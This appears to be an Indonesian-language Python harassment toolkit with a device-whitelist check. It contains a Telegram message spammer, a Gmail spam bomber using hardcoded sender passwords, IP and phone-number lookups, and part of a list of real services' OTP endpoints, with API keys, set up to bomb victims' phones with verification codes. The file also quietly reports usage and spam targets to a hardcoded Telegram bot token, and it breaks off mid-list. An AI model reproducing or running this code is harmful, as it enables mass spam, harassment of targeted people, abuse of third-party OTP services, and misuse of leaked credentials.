#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import re
import uuid
import time
import os
import socket
import subprocess
import json
import smtplib
import requests
import random
import platform
import subprocess
import time
import uuid
from datetime import datetime
from rich.live import Live
from rich.table import Table
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from concurrent.futures import ThreadPoolExecutor, as_completed


# ============ KONFIGURASI ============
WHITELIST_URL = "https://web_get_uid.vercel.app/whitelist" 

def get_device_id():
    try:
        user = os.getlogin()
    except:
        user = os.environ.get('USER', 'unknown')
    hostname = socket.gethostname()
    machine = platform.machine()
    return f"{user}"

def is_device_allowed():
    device_id = get_device_id()
    try:
        resp = requests.get(WHITELIST_URL, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            allowed_ids = data.get('ids', [])
            return device_id in allowed_ids
        else:
            return False
    except Exception as e:
        return False

# ==================== WARNA ====================
RESET = '\033[0m'
PUTIH = '\033[97m'
MERAH = '\033[91m'
HIJAU = '\033[92m'
KUNING = '\033[93m'
BIRU = '\033[94m'
UNGU = '\033[95m'
CYAN = '\033[96m'
YELLOW = '\033[93m'

WARNA_TERPILIH = 'ungu'
COLOR_MAP = {
    'merah': MERAH,
    'hijau': HIJAU,
    'kuning': KUNING,
    'biru': BIRU,
    'ungu': UNGU,
    'cyan': CYAN,
    'putih': PUTIH,
    'reset': RESET,
    'yellow': YELLOW
}
MAIN_COLOR = COLOR_MAP.get(WARNA_TERPILIH, UNGU)

def set_warna(warna):
    global WARNA_TERPILIH, MAIN_COLOR
    if warna in COLOR_MAP:
        WARNA_TERPILIH = warna
        MAIN_COLOR = COLOR_MAP[warna]
        return True
    return False

def Title(text):
    print(f"\n{'='*50}")
    print(f"   {text}")
    print(f"{'='*50}\n")

def Continue():
    input("Tekan Enter untuk melanjutkan...")

def a():
    main()  # Kembali ke menu utama

def get_public_ip():
    try:
        resp = requests.get('https://api.ipify.org', timeout=5)
        return resp.text.strip()
    except:
        return "0.0.0.0"

def get_model():
    try:
        model = subprocess.check_output(
            ["getprop", "ro.product.model"]
        ).decode().strip()
        return model
    except:
        return "Unknown"

def generate_uid():
    return uuid.uuid4().hex[:12]

def get_name():
    try:
        resp = requests.get(
            "https://web_get_uid.vercel.app/status",
            timeout=10
        ).json()

        device_id = get_device_id().strip()

        for user in resp["data"]:
            if user["device_id"] == device_id:
                return user["name"]

        return "Unknown"

    except Exception as e:
        return "Unknown"
def get_status():
    try:
        resp = requests.get(
            "https://web_get_uid.vercel.app/status",
            timeout=10
        ).json()

        device_id = get_device_id().strip()

        for user in resp["data"]:
            if user["device_id"] == device_id:
                return user["status"]

        return "Unknown"

    except Exception:
        return "Unknown"

# ==================== VARIABEL GLOBAL ====================

USER_UID = generate_uid()
USER_STATUS = "Active" if is_device_allowed() else "Inactive"


def jumlah_uid_terdaftar():
    try:
        resp = requests.get(WHITELIST_URL, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            return len(data.get('ids', []))
        return 0
    except:
        return 0

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

print("Device ID Lokal:", repr(get_device_id()))

resp = requests.get("https://web_get_uid.vercel.app/status").json()

def show_banner():
    clear_screen()
    now = datetime.now()
    tanggal = now.strftime('%d-%m-%Y')
    
    ipaddress = get_public_ip()
    jumlah_user = jumlah_uid_terdaftar()
    user_text = f"{jumlah_user} User"
    
    ip_sensor = ipaddress
    nama = get_name()
    uid_text = USER_UID
    nama_text = get_model()
    status_text = get_status()
    
    device_id = get_device_id()
    raw_device = device_id.split('@')[0] if '@' in device_id else device_id
    if 'u0_a' in raw_device:
        device_name = raw_device.replace('u0_a', 'u')
    elif 'u0_' in raw_device:
        device_name = raw_device.replace('u0_', 'u')
    else:
        device_name = raw_device
    device_name = device_name + " 4211"
    
    jarak_users = " " * (16 - len(str(user_text)))
    jarak_tanggal = " " * (16 - len(str(tanggal)))
    jarak_ip = " " * (23 - len(str(ip_sensor)))
    jarak_id = " " * (24 - len(str(uid_text)))
    jarak_nama = " " * max(0, 19 - len(str(nama)))
    jarak_status = " " * (19 - len(str(status_text)))
    jarak_device = " " * (19 - len(str(device_name)))

    # Warna
    a = KUNING
    k = MAIN_COLOR
    p = PUTIH
    h = HIJAU
    m = MERAH

    print(f"""{a}
╭──────────────────────────────────────────────────────────────╮
│{k} ⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠙⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⢀⠀⠈⠛⠶⢤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠈⠳⣤⣀⡀⠀⠈⠉⠛⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠳⢦⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠋⠀⣠⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠠⢤⣤⣀⡀⠀⠁⠀⠀⠀⢀⡆⠀⠹⣦⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⠶⠛⠉⠀⣀⣴⠞⠁⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠳⢦⠀⠀⠀⢸⠀⠀⠀⠘⢷⡀⠈⢷⣄⠀⠀⣀⡴⠞⠉⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⢡⠀⠀⠀⠀⠈⢉⣀⡤⠆⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣄⣀⡀⠀⠀⠀⢸⡆⠀⠀⠀⠈⢻⣄⠀⠉⠛⢋⣩⡶⣀⠀⠐⡇⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⣾⠀⠀⠀⠚⠛⠛⠉⢀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠓⠆⠀⠀⢷⡀⠀⠀⠀⠀⠙⣦⠀⠀⠈⠀⢰⠏⠀⠀⠙⣆⠀⠀⠀⠀⢀⡾⠁⠀⠀⣰⠇⠀⠀⣠⣤⠶⠶⠛⠁⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⡀⠈⢷⡀⠀⠀⠀⠀⠈⠳⣄⡀⢀⡠⠀⠀⠀⠀⠘⣧⠀⣠⠴⠋⠀⠀⠀⣰⠏⢀⣀⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⣠⡾⠋⣀⣀⣀⡀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠾⠛⠉⠀⠀⠀⠙⠳⢦⣤⣤⡤⠖⠀⠀⠀⠀⠀⠀⠀⣸⠃⠤⠤⠶⠞⠿⢦⣤⡀⠈⠉⠉⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠀⠀⣠⡶⠟⠉⢀⣤⠄⠀⢠⠄⢠⡆⠀⠀⠀⠀⠀⠀⣰⡏⢀⡀⠀⠐⢦⡀⠀⠈⠙⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠋⠀⢀⣴⠟⠁⢀⣴⠏⢠⡿⠁⠀⠀⠀⠀⣠⡾⠙⣷⠀⠻⣆⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠞⠋⠀⠴⢋⠀⠀⠠⣆⡴⠞⣿⠀⠀⠙⠂⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠁⢀⣤⠞⢛⡧⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⣴⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⡜⠀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⢰⡇⢰⡇⠀⠀⠀⡠⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⢸⡇⠘⣇⠀⠀⠀⠀⠀⠀⡷⠀⠀⠀⠀⠀⠀⢀⡤⠤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⢿⡀⠙⢦⣄⣀⣀⣠⠞⠁⢀⡄⠀⠀⠀⢠⡏⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡌⢳⣄⠀⠙⠻⠿⠶⠶⠶⠋⠀⢀⠀⠀⠀⠣⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠙⢷⣄⠙⠶⣶⣦⠤⠤⠶⠋⠀⠀⠀⠀⠀⠀⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠉⠳⣄⠀⠉⠓⠶⣤⣤⣀⣀⣠⣤⡴⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠙⣇⠀⠀⠀⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│
│{k} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        {a}│
│{k}                                                              {a}│
│{h} ╔╦╗┌─┐┬─┐┬┌─┌┐┌┌─┐┌─┐┌─┐                                     {a}│
│{h}  ║║├─┤├┬┘├┴┐│││├┤ └─┐└─┐                                     {a}│
│{h} ═╩╝┴ ┴┴└─┴ ┴┘└┘└─┘└─┘└─┘                                     {a}│
├──────────────────────────────────────────────────────────────┤
│{k} {h}ꫝ{p} Author    {m}:{h} XERXEZ                                         {a}│
│{k} {h}ꫝ{p} Version   {m}:{h} 1.3.8                                          {a}│
│{k} {h}ꫝ{p} Users     {m}:{h} {user_text}{jarak_users}                               {a}│
│{k} {h}ꫝ{p} Tanggal   {m}:{h} {tanggal}{jarak_tanggal}                               {a}│
╰──────────────────────────────────────────────────────────────╯
╭──────────────────────────────╮╭──────────────────────────────╮{a}
│{p} IP{m} : {h}{ip_sensor}{jarak_ip}{a} ││{p} NAMA{m}   :{h} {nama:<19} {a}│
│{p} ID{m} :{h} {device_id}{jarak_id}     {a}││{p} STATUS{m} : {h}{status_text:<19} {a}│
╰──────────────────────────────╯╰──────────────────────────────╯{RESET}""")

# ==================== TELEGRAM LOGGER ====================
TELEGRAM_BOT_TOKEN = "8760728891:AAFIXvhyzuXCUG_qBmHqJIo3vFlIpn2IchM"  # GANTI DENGAN TOKEN BOT MU
TELEGRAM_CHAT_ID = "8444579961"  # GANTI DENGAN CHAT ID MU

def send_telegram_log(message):
    """Kirim log aktivitas ke Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def log_activity(action, detail=""):
    """Catat aktivitas dan kirim ke Telegram"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    device_id = get_name()
    ip = get_public_ip()
    
    message = f"""
<b>⚡ DARK SHADOW - LOG AKTIVITAS</b>
🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨
────────────────────
🕐 <b>Waktu</b>: {timestamp}
📋 <b>Aksi</b>: {action}
📝 <b>Target</b>: {detail}
🤦 <b>Nama</b>: {device_id}
🌐 <b>IP</b>: {ip}
────────────────────
<b>🔮 DARK SHADOW - Monitoring</b>
    """
    send_telegram_log(message)

def telegram_spam():
    print("1. Spam Teks")
    print("2. Spam Gambar")
    print("3. Spam Teks + Gambar")

    sp = input("\nPilih Menu -> ")

    if sp in ['01', '1']:
        token = input("Masukkan Token : ")
        chat_id = input("Masukkan Chat Id : ")
        text = input("Text : ")
        jumlah = int(input("Jumlah : "))

        print("Processing...")

        for i in range(jumlah):
            send_text = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&parse_mode=Markdown&text={text}'
            requests.get(send_text)
            print(f"Succes : {i}")

        print(f"Berhasil spam dengan teks : {text} Dengan Jumlah {jumlah}")

    if sp in ['02', '2']:
        token = input("Masukkan Token : ")
        chat_id = input("Masukkan Chat Id : ")
        photo_url = input("Image Url : ")
        jumlah = int(input("Jumlah : "))

        print("Processing...")

        for i in range(jumlah):
            send_photo = f'https://api.telegram.org/bot{token}/sendPhoto?chat_id={chat_id}&photo={photo_url}'
            requests.get(send_photo)
            print(f"Succes : {i}")

        print(f"Berhasil spam dengan gambar, Dengan Jumlah {jumlah}")

    if sp in ['03', '3']:
        token = input("Masukkan Token : ")
        chat_id = input("Masukkan Chat Id : ")
        text = input("Text : ")
        photo_url = input("Image Url : ")
        jumlah = int(input("Jumlah : "))

        print("Processing...")

        for i in range(jumlah):
            send_photo = f'https://api.telegram.org/bot{token}/sendPhoto?chat_id={chat_id}&photo={photo_url}'
            send_text = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&parse_mode=Markdown&text={text}'
            requests.get(send_photo)
            requests.get(send_text)
            print(f"Succes : {i}")

        print(f"Berhasil spam dengan teks : {text} dan Gambar, Dengan Jumlah {jumlah}")

def back_to_menu():
    print("\nDibatalkan.")
    return

def scan_virustotal():
    api_key = input("Masukkan VirusTotal API Key: ").strip()
    file_path = input("Masukkan path file: ").strip()

    if not os.path.isfile(file_path):
        print("[!] File tidak ditemukan.")
        return

    headers = {
        "x-apikey": api_key
    }

    try:
        with open(file_path, "rb") as f:
            files = {
                "file": (os.path.basename(file_path), f)
            }

            print("[*] Mengunggah file ke VirusTotal...")
            upload = requests.post(
                "https://www.virustotal.com/api/v3/files",
                headers=headers,
                files=files
            )

        if upload.status_code != 200:
            print(f"[!] Upload gagal ({upload.status_code})")
            print(upload.text)
            return

        analysis_id = upload.json()["data"]["id"]

        print("[*] Menunggu hasil analisis...")

        while True:
            result = requests.get(
                f"https://www.virustotal.com/api/v3/analyses/{analysis_id}",
                headers=headers
            ).json()

            status = result["data"]["attributes"]["status"]

            if status == "completed":
                stats = result["data"]["attributes"]["stats"]

                print("\n===== HASIL SCAN =====")
                print(f"Malicious : {stats['malicious']}")
                print(f"Suspicious: {stats['suspicious']}")
                print(f"Undetected: {stats['undetected']}")
                print(f"Harmless  : {stats['harmless']}")
                print(f"Timeout   : {stats['timeout']}")
                print(f"Failure   : {stats['failure']}")
                break

            time.sleep(3)

    except Exception as e:
        print(f"[!] Error: {e}")

def scrape_web(url, selector=None, folder="Hasil Scrape/hasil"):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    os.makedirs(folder, exist_ok=True)

    response = requests.get(url, headers=headers, timeout=10)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    hasil = "\n".join(el.get_text(strip=True) for el in soup.select(selector)) if selector else soup.get_text(strip=True)

    filename = f"scrape_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    filepath = os.path.join(folder, filename)

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(hasil)

    return filepath
# ==================== SPAM EMAIL ====================
GMAIL_SENDERS = [
    {"email": "shoope1456@gmail.com", "password": "ihwu mtuk ilpf hjng"},
    {"email": "shoopee1456@gmail.com", "password": "bvee tsie vfgm spkk"}
]
sender_index = 0

def get_next_sender():
    global sender_index
    sender = GMAIL_SENDERS[sender_index]
    sender_index = (sender_index + 1) % len(GMAIL_SENDERS)
    return sender

def send_email_via_smtp(recipient, sender, subject, html_content):
    try:
        msg = MIMEMultipart('alternative')
        msg['From'] = sender['email']
        msg['To'] = recipient
        msg['Subject'] = subject
        part = MIMEText(html_content, 'html')
        msg.attach(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender['email'], sender['password'])
        server.sendmail(sender['email'], recipient, msg.as_string())
        server.quit()
        return {'success': True, 'info': 'OK'}
    except Exception as e:
        return {'success': False, 'info': str(e)}

def spam_email(recipient, count, custom_message='Spam Email'):
    results = []
    max_count = min(count, 50)
    msg = custom_message[:20]
    for i in range(max_count):
        sender = get_next_sender()
        subject = f"{msg} #{i+1}"
        html = f"""
        <h2>{msg} #{i+1}</h2>
        <p>Dikirim dari akun {sender['email']}</p>
        <p>Waktu: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Pesan: {msg}</p>
        <hr>
        <small>Email otomatis - test</small>
        """
        result = send_email_via_smtp(recipient, sender, subject, html)
        results.append({
            'attempt': i+1,
            'sender': sender['email'],
            'success': result['success'],
            'info': result['info']
        })
        time.sleep(1)
    return results

def gmail_spam():

    recipient = input(PUTIH + "Masukkan email target: " + RESET).strip()
    if not recipient or '@' not in recipient:
        print(MERAH + "[!] Email tidak valid." + RESET)
        return
    jumlah_input = input(PUTIH + "Jumlah email (default 50): " + RESET).strip()
    count = 50
    if jumlah_input.isdigit():
        count = int(jumlah_input)
        if count > 50:
            count = 50
    pesan = input(PUTIH + "Pesan (max 20 karakter, default 'Spam Email'): " + RESET).strip()
    if not pesan:
        pesan = 'Spam Email'
    pesan = pesan[:20]
    print(PUTIH + f"\n[+] Memulai spam ke {recipient} sebanyak {count} kali dengan pesan '{pesan}' ..." + RESET)
    log_activity("SPAM EMAIL", f"Target: {recipient}")
    results = spam_email(recipient, count, pesan)
    print(PUTIH + "\n[+] HASIL SPAM EMAIL" + RESET)
    for r in results:
        status = "OK" if r['success'] else "FAIL"
        print(f"  {status} Percobaan {r['attempt']} ({r['sender']}): {r['info']}")
    success_count = sum(1 for r in results if r['success'])
    fail_count = len(results) - success_count
    print(PUTIH + f"[+] Berhasil: {success_count}  Gagal: {fail_count}  Total: {len(results)}" + RESET)
    input(PUTIH + "\nTekan Enter untuk kembali..." + RESET)

# ==================== IP TRACKER ====================
def track_ip(ip):
    try:
        res = requests.get(f'https://ipinfo.io/{ip}/json', timeout=10)
        if res.status_code == 200:
            data = res.json()
            if data and not data.get('bogon', False):
                return {
                    'success': True,
                    'ip': data.get('ip', ip),
                    'hostname': data.get('hostname', '-'),
                    'city': data.get('city', '-'),
                    'region': data.get('region', '-'),
                    'country': data.get('country', '-'),
                    'loc': data.get('loc', '-'),
                    'org': data.get('org', '-'),
                    'timezone': data.get('timezone', '-')
                }
        fallback = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query', timeout=10)
        if fallback.status_code == 200:
            data = fallback.json()
            if data.get('status') == 'success':
                return {
                    'success': True,
                    'ip': data.get('query', ip),
                    'hostname': '-',
                    'city': data.get('city', '-'),
                    'region': data.get('regionName', '-'),
                    'country': data.get('country', '-'),
                    'loc': '-',
                    'org': data.get('isp', data.get('org', '-')),
                    'timezone': '-'
                }
        return {'success': False, 'message': 'IP tidak ditemukan'}
    except Exception as e:
        return {'success': False, 'message': str(e)}

def ip_tracker():
    target = input(PUTIH + "Masukkan IP atau domain: " + RESET).strip()
    if not target:
        print(MERAH + "[!] Input tidak valid." + RESET)
        return
    print(PUTIH + f"\n[+] Melacak {target} ..." + RESET)
    result = track_ip(target)
    if not result['success']:
        print(MERAH + f"[!] {result['message']}" + RESET)
    else:
        print(PUTIH + "\n[+] INFORMASI IP" + RESET)
        print(f"  IP      : {result['ip']}")
        print(f"  Hostname: {result['hostname']}")
        print(f"  Kota    : {result['city']}")
        print(f"  Region  : {result['region']}")
        print(f"  Negara  : {result['country']}")
        print(f"  Lokasi  : {result['loc']}")
        print(f"  ISP     : {result['org']}")
        print(f"  Timezone: {result['timezone']}")
    input(PUTIH + "\nTekan Enter untuk kembali..." + RESET)

# ==================== PHONE INFO ====================
def phone_info(phone_number):
    try:
        import phonenumbers
        from phonenumbers import carrier, geocoder, PhoneNumberType
    except ImportError:
        return {'success': False, 'message': "Modul phonenumbers belum terinstall. Jalankan: pip install phonenumbers phonenumbers-carrier"}

    try:
        parsed = phonenumbers.parse(phone_number, None)
        if not phonenumbers.is_valid_number(parsed):
            return {'success': False, 'message': 'Nomor tidak valid.'}
        country = geocoder.country_name_for_number(parsed, 'id')
        operator = carrier.name_for_number(parsed, 'id')
        if not operator:
            operator = 'Tidak diketahui'
        number_type = phonenumbers.number_type(parsed)
        type_map = {
            PhoneNumberType.MOBILE: 'Mobile',
            PhoneNumberType.FIXED_LINE: 'Fixed Line',
            PhoneNumberType.FIXED_LINE_OR_MOBILE: 'Fixed/Mobile',
            PhoneNumberType.TOLL_FREE: 'Toll Free',
            PhoneNumberType.PREMIUM_RATE: 'Premium Rate',
            PhoneNumberType.SHARED_COST: 'Shared Cost',
            PhoneNumberType.VOIP: 'VoIP',
            PhoneNumberType.PERSONAL_NUMBER: 'Personal Number',
            PhoneNumberType.PAGER: 'Pager',
            PhoneNumberType.UAN: 'UAN',
            PhoneNumberType.VOICEMAIL: 'Voicemail',
            PhoneNumberType.UNKNOWN: 'Unknown'
        }
        type_str = type_map.get(number_type, 'Unknown')
        return {
            'success': True,
            'country': country,
            'operator': operator,
            'type': type_str,
            'country_code': parsed.country_code,
            'national_number': parsed.national_number
        }
    except Exception as e:
        return {'success': False, 'message': str(e)}

def phone_info_menu():
    number = input(PUTIH + "Masukkan nomor (format +62...): " + RESET).strip()
    if not number:
        print(MERAH + "[!] Input kosong." + RESET)
        return
    print(PUTIH + f"\n[+] Memeriksa nomor {number} ..." + RESET)
    result = phone_info(number)
    if not result['success']:
        print(MERAH + f"[!] {result['message']}" + RESET)
    else:
        print(PUTIH + "\n[+] INFORMASI NOMOR" + RESET)
        print(f"  Negara        : {result['country']}")
        print(f"  Operator      : {result['operator']}")
        print(f"  Tipe          : {result['type']}")
        print(f"  Kode Negara   : +{result['country_code']}")
        print(f"  Nomor Nasional: {result['national_number']}")
    input(PUTIH + "\nTekan Enter untuk kembali..." + RESET)

# ==================== OTP PLATFORMS ====================
OTP_PLATFORMS = [
    {
        'name': 'Rumah123',
        'url': 'https://www.rumah123.com/api/otp/request-otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.rumah123.com'
        },
        'payload': lambda phone: {
            'phoneNumber': phone,
            'ipAddress': '103.166.26.108',
            'portalId': 1,
            'type': 'WHATSAPP'
        }
    },
    {
        'name': 'SATURDAYS',
        'url': 'https://beta.api.saturdays.com/api/v1/user/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': '*/*',
            'Authorization': 'undefined',
            'Content-Type': 'application/json',
            'Country-Code': 'ID',
            'Currency-Code': 'IDR',
            'Device-Type': 'mweb',
            'Platform': 'mweb',
            'Origin': 'https://saturdays.com',
            'Referer': 'https://saturdays.com/',
            'X-Api-Key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj',
            'Sec-Ch-Ua': '"Chromium";v="139", "Not;A-Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        },
        'payload': lambda phone: {
            'number': re.sub(r'^0|^62|\+62', '', phone),
            'country_code': '+62',
            'type': ''
        }
    },
    {
        'name': 'IRA - Internet Rakyat',
        'url': 'https://internetrakyat.id/api/app/auth/send-otp-register',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'x-api-key': '280999!FTTH'
        },
        'payload': lambda phone: {'phone_number': phone}
    },
    {
        'name': 'Fastwork',
        'url': 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        },
        'payload': lambda phone: {
            'phone_number': '0' + phone[2:] if phone.startswith('62') else phone
        }
    },
    {
        'name': 'Planet Ban',
        'url': 'https://api.planetban.com/website/customer/request-otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        },
        'payload': lambda phone: {'phone': phone}
    },
    {
        'name': 'Pinhome',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'text/plain;charset=UTF-8',
